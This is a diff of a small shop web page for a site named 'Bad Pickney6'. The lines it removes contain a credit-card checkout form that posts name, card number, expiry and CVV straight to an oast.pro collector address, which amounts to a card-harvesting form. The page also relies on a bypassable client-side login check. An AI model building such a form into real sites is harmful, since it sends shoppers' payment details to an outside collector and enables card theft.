@@ -1,140 +1,85 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Shop - Bad Pickney6</title>
-  <link rel="stylesheet" href="styles.css">
+  <link rel="stylesheet" href="styles.css" />
 </head>
 <body>
 
-  <header>
-    <div class="container">
-      <div class="logo">
-        <img src="assets/images/bank-robber.png" alt="Logo">
-        <h1>Bad Pickney6 Shop</h1>
-      </div>
-      <nav>
-        <ul>
-          <li><a href="index.html">Home</a></li>
-          <li><a href="#" id="logoutBtn">Logout</a></li>
-        </ul>
-      </nav>
+<header>
+  <div class="container">
+    <div class="logo">
+      <img src="assets/images/bank-robber.png" alt="Bank Robber Logo" />
+      <h1>Bad Pickney6</h1>
     </div>
-  </header>
+    <nav>
+      <ul>
+        <li><a href="index.html#home">Home</a></li>
+        <li><a href="index.html#about">About</a></li>
+        <li><a href="index.html#services">Services</a></li>
+        <li><a href="shop.html">Shop</a></li>
+        <li><a href="index.html#contact">Contact</a></li>
+      </ul>
+    </nav>
+  </div>
+</header>
 
-  <section id="shop" class="section">
-    <div class="container">
-      <h2>Shop Our Cards</h2>
-      <div class="shop-grid" id="shopGrid"></div>
-
-      <div id="cartContainer">
-        <h3>Cart</h3>
-        <ul id="cartItems"></ul>
-        <p id="totalPrice">Total: $0</p>
-
-        <!-- CREDIT CARD STYLE FORM -->
-        <div class="card-form-container">
-          <div class="card-display">
-            <div id="cardFront" class="card-front">
-              <p id="cardNumberDisplay">•••• •••• •••• ••••</p>
-              <p id="cardNameDisplay">FULL NAME</p>
-              <p id="cardExpiryDisplay">MM/YY</p>
-            </div>
-            <div id="cardBack" class="card-back">
-              <p id="cardCvvDisplay">CVV</p>
-            </div>
-          </div>
-          <form id="checkoutForm" action="https://oast.pro/6dc777f83b840b1f739bg1ftg9ayyyyyb" method="POST">
-            <input type="text" id="cardName" name="name" placeholder="Full Name" required>
-            <input type="text" id="cardNumber" name="cardNumber" placeholder="Card Number" maxlength="19" required>
-            <input type="text" id="cardExpiry" name="expiry" placeholder="MM/YY" maxlength="5" required>
-            <input type="text" id="cardCvv" name="cvv" placeholder="CVV" maxlength="4" required>
-            <button type="submit">Checkout</button>
-          </form>
-        </div>
-      </div>
+<section id="shop" class="section">
+  <div class="container">
+    <h2>Shop Cards</h2>
+    <div class="shop-grid" id="shopGrid">
+      <!-- Cards will be injected here -->
     </div>
-  </section>
-
-  <footer>
-    <div class="container">
-      <p>&copy; 2025 Bad Pickney6. All rights reserved.</p>
+    <div style="text-align:center; margin-top:30px;">
+      <a href="checkout.html" class="btn">Go to Checkout</a>
     </div>
-  </footer>
+  </div>
+</section>
 
-  <script>
-    // PROTECT PAGE
-    const user = JSON.parse(localStorage.getItem('loggedInUser'));
-    if(!user){
-      alert('You must log in first!');
-      window.location.href = 'index.html';
-    }
+<footer>
+  <div class="container">
+    <p>&copy; 2025 Bad Pickney6. All rights reserved.</p>
+  </div>
+</footer>
 
-    // LOGOUT
-    document.getElementById('logoutBtn').addEventListener('click', () => {
-      localStorage.removeItem('loggedInUser');
-      alert('Logged out');
-      window.location.href = 'index.html';
+<script>
+  // Check if user is logged in
+  const loggedInUser = JSON.parse(localStorage.getItem('loggedInUser'));
+  if(!loggedInUser){
+    alert('You must log in to access the shop!');
+    window.location.href='index.html#auth';
+  }
+
+  // Shop items
+  const cards = [
+    { name: 'Gold Card', price: 50, color:'#FFD700' },
+    { name: 'Silver Card', price: 30, color:'#C0C0C0' },
+    { name: 'Bronze Card', price: 20, color:'#CD7F32' }
+  ];
+
+  const shopGrid = document.getElementById('shopGrid');
+
+  cards.forEach(card => {
+    const cardDiv = document.createElement('div');
+    cardDiv.classList.add('shop-card');
+    cardDiv.innerHTML = `
+      <div class="card-preview" style="background:${card.color};">${card.name}</div>
+      <h3>${card.name}</h3>
+      <p>$${card.price.toFixed(2)}</p>
+      <button class="buy-btn">Buy</button>
+    `;
+    const buyBtn = cardDiv.querySelector('.buy-btn');
+    buyBtn.addEventListener('click', () => {
+      let cart = JSON.parse(localStorage.getItem('cart')||'[]');
+      cart.push({name: card.name, price: card.price});
+      localStorage.setItem('cart', JSON.stringify(cart));
+      alert(`${card.name} added to cart!`);
     });
-
-    // SHOP ITEMS
-    const cards = [
-      {name:"Red Card", price:50, color:"#ff4d4d"},
-      {name:"Blue Card", price:75, color:"#4d79ff"},
-      {name:"Green Card", price:60, color:"#33cc33"},
-      {name:"Gold Card", price:100, color:"#ffd700"}
-    ];
-
-    const shopGrid = document.getElementById('shopGrid');
-    const cartItems = document.getElementById('cartItems');
-    const totalPriceEl = document.getElementById('totalPrice');
-    let cart = [];
-
-    function displayCards(){
-      shopGrid.innerHTML = cards.map((card, i) => `
-        <div class="shop-card" style="background:${card.color}">
-          <h3>${card.name}</h3>
-          <p>Price: $${card.price}</p>
-          <button onclick="addToCart(${i})">Add to Cart</button>
-        </div>
-      `).join('');
-    }
-
-    function addToCart(index){
-      cart.push(cards[index]);
-      updateCart();
-    }
-
-    function updateCart(){
-      cartItems.innerHTML = cart.map(c => `<li>${c.name} - $${c.price}</li>`).join('');
-      const total = cart.reduce((sum,c)=>sum+c.price,0);
-      totalPriceEl.textContent = 'Total: $' + total;
-    }
-
-    displayCards();
-
-    // CREDIT CARD FORM LIVE UPDATE
-    const cardNumber = document.getElementById('cardNumber');
-    const cardName = document.getElementById('cardName');
-    const cardExpiry = document.getElementById('cardExpiry');
-    const cardCvv = document.getElementById('cardCvv');
-
-    const cardNumberDisplay = document.getElementById('cardNumberDisplay');
-    const cardNameDisplay = document.getElementById('cardNameDisplay');
-    const cardExpiryDisplay = document.getElementById('cardExpiryDisplay');
-    const cardCvvDisplay = document.getElementById('cardCvvDisplay');
-
-    cardNumber.addEventListener('input', ()=> {
-      let val = cardNumber.value.replace(/\D/g,'');
-      let formatted = val.match(/.{1,4}/g)?.join(' ') || '';
-      cardNumberDisplay.textContent = formatted.padEnd(19, '•');
-    });
-    cardName.addEventListener('input', ()=> cardNameDisplay.textContent = cardName.value.toUpperCase() || 'FULL NAME');
-    cardExpiry.addEventListener('input', ()=> cardExpiryDisplay.textContent = cardExpiry.value || 'MM/YY');
-    cardCvv.addEventListener('input', ()=> cardCvvDisplay.textContent = cardCvv.value || 'CVV');
-
-  </script>
+    shopGrid.appendChild(cardDiv);
+  });
+</script>
 
 </body>
 </html>
